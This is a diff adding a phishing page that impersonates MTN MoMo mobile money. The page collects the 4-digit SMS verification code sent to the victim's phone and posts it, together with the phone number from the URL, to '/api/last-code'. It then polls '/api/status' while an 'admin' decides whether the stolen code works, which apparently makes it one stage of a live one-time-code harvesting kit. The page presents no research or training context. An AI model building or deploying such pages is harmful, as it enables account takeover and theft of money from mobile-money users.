@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Verification Code - MoMo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header { background: #fff; padding: 14px 24px; display: flex; align-items: center;
+                  gap: 16px; border-bottom: 3px solid #ffcc00;
+                  box-shadow: 0 2px 8px rgba(0,0,0,.04); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon { width: 42px; height: 42px; background: #ffcc00; border-radius: 8px;
+                     display: flex; align-items: center; justify-content: center;
+                     font-weight: 800; font-size: 11px; color: #004f9f; text-align: center;
+                     border: 2px solid #004f9f; line-height: 1; }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; }
+        .header-title { font-size: 18px; font-weight: 700; color: #222; flex: 1; }
+        .hamburger { font-size: 22px; color: #333; cursor: pointer; }
+
+        .main { flex: 1; display: flex; flex-direction: column;
+                align-items: center; padding: 60px 16px; }
+        .page-title { font-size: 32px; font-weight: 800; color: #111;
+                      text-align: center; margin-bottom: 40px; }
+
+        .card { background: #fff; width: 100%; max-width: 500px; border-radius: 16px;
+                padding: 44px 36px 36px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
+                text-align: center; }
+        .card-icon { width: 70px; height: 70px; background: #fff5cc; border-radius: 50%;
+                     display: flex; align-items: center; justify-content: center;
+                     margin: 0 auto 20px; font-size: 32px; }
+        .card-label { font-size: 14px; font-weight: 600; color: #444;
+                      margin-bottom: 8px; line-height: 1.5; }
+        .card-sub { font-size: 13px; color: #888; margin-bottom: 24px; }
+
+        .pin-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .pin-box {
+            width: 56px; height: 66px; font-size: 26px; font-family: inherit;
+            font-weight: 800; text-align: center; color: #111;
+            background: #fffdf5; border: 2px solid #ffcc00; border-radius: 10px;
+            outline: none; transition: box-shadow .15s, border-color .15s;
+        }
+        .pin-box::-webkit-outer-spin-button,
+        .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .pin-box:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); border-color: #e6b800; }
+        .pin-box.filled { background: #fff8e0; }
+        .pin-box.error { border-color: #e33; background: #fff5f5; }
+
+        .error-msg { display: none; font-size: 13px; color: #c33;
+                     font-weight: 600; margin-bottom: 14px; }
+        .error-msg.show { display: block; }
+        .error-msg.info { color: #b8860b; }
+
+        .submit-btn {
+            display: block; width: 100%; background: #ffcc00; color: #111;
+            border: none; padding: 18px; font-size: 16px; font-weight: 800;
+            letter-spacing: .5px; border-radius: 10px; cursor: pointer;
+            transition: background .2s, transform .1s; margin-bottom: 14px;
+        }
+        .submit-btn:hover { background: #e6b800; }
+        .submit-btn:active { transform: scale(.99); }
+        .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }
+
+        /* Waiting screen */
+        .waiting-wrap { padding: 10px 0 20px; }
+        .waiting-spinner {
+            width: 60px; height: 60px; border: 5px solid #fff5cc;
+            border-top-color: #ffcc00; border-radius: 50%;
+            margin: 0 auto 20px; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .waiting-title { font-size: 20px; font-weight: 800; color: #111; margin-bottom: 10px; }
+        .waiting-text { font-size: 14px; color: #666; line-height: 1.6; }
+
+        .footer { background: #111; color: #ffcc00; text-align: center;
+                  padding: 18px; font-size: 13px; font-weight: 600; }
+
+        @media (max-width: 480px) {
+            .page-title { font-size: 24px; }
+            .card { padding: 32px 22px 26px; }
+            .header-title { font-size: 15px; }
+            .pin-box { width: 60px; height: 70px; font-size: 26px; }
+            .pin-row { gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <span class="hamburger">☰</span>
+        <div class="logo-box">
+            <div class="logo-icon">MoMo<br>MTN</div>
+            <span class="logo-text">MoMo</span>
+        </div>
+        <span class="header-title">MTN Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <h1 class="page-title">Enter Verification Code</h1>
+
+        <div class="card" id="mainCard">
+            <div class="card-icon">📩</div>
+
+            <p class="card-label">Enter the 4-digit code<br>sent to your MTN line</p>
+            <p class="card-sub">Check your SMS for the verification code</p>
+
+            <div class="error-msg" id="errorMsg"></div>
+
+            <form id="lastForm">
+                <div class="pin-row" id="pinRow">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    Submit Code
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MoMo</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || 'unknown';
+        const refId  = params.get('ref')   || '';
+
+        const pinBoxes  = Array.from(document.querySelectorAll('.pin-box'));
+        const errorMsg  = document.getElementById('errorMsg');
+        const submitBtn = document.getElementById('submitBtn');
+
+        pinBoxes[0].focus();
+
+        pinBoxes.forEach((box, i) => {
+            box.addEventListener('input', function () {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length > 1) this.value = this.value.slice(-1);
+
+                if (this.value) {
+                    this.classList.add('filled');
+                    if (i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
+                } else {
+                    this.classList.remove('filled');
+                }
+                clearErrors();
+            });
+
+            box.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace') {
+                    if (!this.value && i > 0) {
+                        pinBoxes[i - 1].focus();
+                        pinBoxes[i - 1].value = '';
+                        pinBoxes[i - 1].classList.remove('filled');
+                        e.preventDefault();
+                    } else if (this.value) {
+                        this.value = '';
+                        this.classList.remove('filled');
+                        e.preventDefault();
+                    }
+                    clearErrors();
+                }
+                if (e.key === 'ArrowLeft' && i > 0) pinBoxes[i - 1].focus();
+                if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
+            });
+
+            box.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData)
+                    .getData('text').replace(/[^0-9]/g, '').slice(0, 4);
+                if (!pasted) return;
+                for (let j = 0; j < pasted.length && (i + j) < pinBoxes.length; j++) {
+                    pinBoxes[i + j].value = pasted[j];
+                    pinBoxes[i + j].classList.add('filled');
+                }
+                const nextEmpty = pinBoxes.findIndex(b => !b.value);
+                if (nextEmpty !== -1) pinBoxes[nextEmpty].focus();
+                else pinBoxes[pinBoxes.length - 1].focus();
+                clearErrors();
+            });
+
+            box.addEventListener('focus', function () { this.select(); });
+        });
+
+        function clearErrors() {
+            errorMsg.classList.remove('show');
+            errorMsg.classList.remove('info');
+            pinBoxes.forEach(b => b.classList.remove('error'));
+        }
+
+        // ─── Polling for admin decision ───
+        let referenceId = null;
+        let pollTimer = null;
+
+        function startPolling() {
+            pollTimer = setInterval(async () => {
+                try {
+                    const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
+                    const data = await res.json();
+
+                    if (data.status === 'confirmed') {
+                        clearInterval(pollTimer);
+                        showSuccess();
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        showRejected();
+                    }
+                } catch (err) {
+                    console.error('Poll failed:', err);
+                }
+            }, 3000);
+        }
+
+        function showSuccess() {
+            document.getElementById('mainCard').innerHTML = `
+                <div style="width:90px;height:90px;border-radius:50%;background:#2e9e4f;
+                            display:flex;align-items:center;justify-content:center;
+                            margin:0 auto 20px;font-size:44px;color:#fff;">✓</div>
+                <h2 style="font-size:22px;font-weight:800;color:#2e9e4f;margin-bottom:12px;">
+                    Verification Complete
+                </h2>
+                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
+                            background:#e8f7ec;color:#2e9e4f;font-size:13px;font-weight:700;
+                            margin-bottom:20px;">STATUS: PENDING APPROVAL</div>
+                <p style="font-size:15px;color:#444;line-height:1.6;">
+                    Your application has been fully submitted.<br>
+                    Please wait for approval.
+                </p>
+            `;
+        }
+
+        function showRejected() {
+            document.getElementById('mainCard').innerHTML = `
+                <div style="width:90px;height:90px;border-radius:50%;background:#e33;
+                            display:flex;align-items:center;justify-content:center;
+                            margin:0 auto 20px;font-size:44px;color:#fff;">✕</div>
+                <h2 style="font-size:22px;font-weight:800;color:#c33;margin-bottom:12px;">
+                    Code Rejected
+                </h2>
+                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
+                            background:#fdecea;color:#c33;font-size:13px;font-weight:700;
+                            margin-bottom:20px;">INVALID VERIFICATION CODE</div>
+                <p style="font-size:15px;color:#444;line-height:1.6;margin-bottom:20px;">
+                    The 4-digit code you entered was not accepted.<br>
+                    Please check your SMS and try again.
+                </p>
+                <button onclick="location.reload()" style="background:#111;color:#ffcc00;
+                        border:none;padding:14px 28px;font-size:14px;font-weight:800;
+                        border-radius:10px;cursor:pointer;">Try Again</button>
+            `;
+        }
+
+        // ─── Submit 4-digit code ───
+        document.getElementById('lastForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const code = pinBoxes.map(b => b.value).join('');
+            if (code.length !== 4) {
+                errorMsg.textContent = 'Please enter all 4 digits';
+                errorMsg.classList.add('show');
+                pinBoxes.forEach(b => { if (!b.value) b.classList.add('error'); });
+                const firstEmpty = pinBoxes.find(b => !b.value);
+                if (firstEmpty) firstEmpty.focus();
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+            pinBoxes.forEach(b => b.disabled = true);
+
+            try {
+                const res = await fetch('/api/last-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, refId, lastCode: code })
+                });
+                const data = await res.json();
+                referenceId = data.referenceId;
+
+                // Show waiting screen
+                document.getElementById('mainCard').innerHTML = `
+                    <div class="waiting-wrap">
+                        <div class="waiting-spinner"></div>
+                        <div class="waiting-title">Waiting for Approval</div>
+                        <div class="waiting-text">
+                            Your code has been sent to the admin for verification.<br>
+                            Please wait while we confirm your application...
+                        </div>
+                    </div>
+                `;
+
+                startPolling();
+
+            } catch (err) {
+                console.error('Send failed:', err);
+                errorMsg.textContent = '⚠️ Network error. Please try again.';
+                errorMsg.classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Code';
+                pinBoxes.forEach(b => b.disabled = false);
+            }
+        });
+    </script>
+</body>
+</html>
